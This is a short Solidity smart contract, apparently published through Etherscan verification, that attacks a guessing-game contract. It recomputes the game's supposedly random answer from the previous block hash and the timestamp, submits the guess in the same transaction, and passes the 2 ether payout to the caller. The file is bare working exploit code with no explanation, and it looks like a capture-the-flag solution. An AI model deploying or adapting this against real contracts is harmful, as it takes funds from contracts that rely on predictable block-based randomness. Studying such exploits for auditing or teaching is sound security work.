/**
 *Submitted for verification at Etherscan.io on 2022-04-02
*/

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

contract Getit {

    receive() external payable {
    }

    function guessHere(address _contract) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        bool success;
        bytes memory returndata;
        (success, returndata) = _contract.call{value: 1 ether}(abi.encodeWithSignature("guess(uint8)", answer));
        require(success, string (returndata));
        (success, returndata) = msg.sender.call{value: 2 ether}("");
        require(success, string (returndata));
    }
}